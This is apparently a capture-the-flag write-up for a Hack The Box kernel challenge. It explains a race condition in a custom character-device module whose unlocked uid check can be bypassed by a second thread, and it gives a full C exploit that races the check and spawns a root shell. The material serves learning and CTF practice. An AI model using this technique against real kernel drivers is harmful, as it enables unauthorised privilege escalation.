# HTB Kernel Adventrue Part I

## Description

- This challenge is a linux kernel pwn.And I'm not familiar with that.So it takes me some time to solve this challenge(BTW, upload the exp to the server also took a lot of time)

## Vulnerability

- The vulnerability is race condition.
- This challenge has a linux kernel module named mysu.ko.It is a simple char device.There are only two interface which communicate with user space named `dev_write`，`dev_read`.
- When you enter dev_write.It will check the first 4 bytes of the buffer.It must be 0x3e8 or 0x3e9.Then it will enter the `hash` function.This function implement a hash algorithm and it will calc the hash value of the last bytes in your buffer.The hash value must equal to a magic number.But this magic number is zero in the archive the author give us.So it's easy to exploit it on our local machine.It will call `prepare_creds` function and use the first 4 bytes in your buffer to set uid and gid then call  `commit_creds` function.With the first check,the uid must be 0x3e8 or 0x3e9?
- No.The start script indicates this machine has 2 cpu.And the whole procedure doesn't use a lock.So we could set the first 4 bytes to pass the check.Then we can start another thread to set the first 4 bytes to 0.We could meet the situation when we use 0x3e9 to pass the first check and another cpu set the first 4 bytes to 0.Then we pass the hash check.The uid and gid will be 0.So we become root.
- I compile the exp with static option and use gzip to compress it.The I use base64 so that I can copy and paste it on the remote machine.

## Exploit

```c
#include<stdint.h>
#include<stdio.h>
#include<fcntl.h>
#include<pthread.h>
void set_buffer(char *);
int ok = 1;
int main() {
	int fd = open("/dev/mysu", O_RDWR);
	if(fd < 0) {
		printf("[-]open the device failed!\n");
		return -1;
	}

	char *buf = (char *)malloc(0x20);
	unsigned int hash = 0;
	read(fd, buf, 0x20);
	hash = *(unsigned int *)(buf + 0xC);
	printf("the hash value is 0x%x\n", hash);
	memset(buf, 0, 0x20);
	*(unsigned int *)buf = 0x3e9;
	char table[5] = {0x5e, 0x6a, 0x8e, 0x75, 0x23}; 
	int i = 0;
	for(i = 0; i < 5; i++) {
		*(buf + i + 4) = table[i];
	} 
	int count = 0;
	pthread_t ntid;
	pthread_create(&ntid, NULL, set_buffer, buf);
	printf("start race condition!\n");
	while(count != 10000000) {
		if(getuid() == 0){
			ok = 0;
			printf("I'm root right now!\n");
			system("/bin/sh");
		}
		*(unsigned int *)buf = 0x3e9;
   		char table[5] = {0x5e, 0x6a, 0x8e, 0x75, 0x23}; 
   		for(i = 0; i < 5; i++) {
   			*(buf + i + 4) = table[i];
   		}
		write(fd, buf, 10);
		if(getuid() == 0){
          ok = 0;
		  printf("I'm root right now!\n");
		  system("/bin/sh");
		}

		count++;
	}
	ok = 0;
	pthread_join(ntid, NULL);
	close(fd);
	return 0;
}

void set_buffer(char *buf) {
	while(ok) {
		uint32_t *buffer = (uint32_t *)buf;
		*buffer = 0;
		if(getuid() == 0){
			printf("I'm root right now!\n");
			ok = 0;
		}
	}
}
```

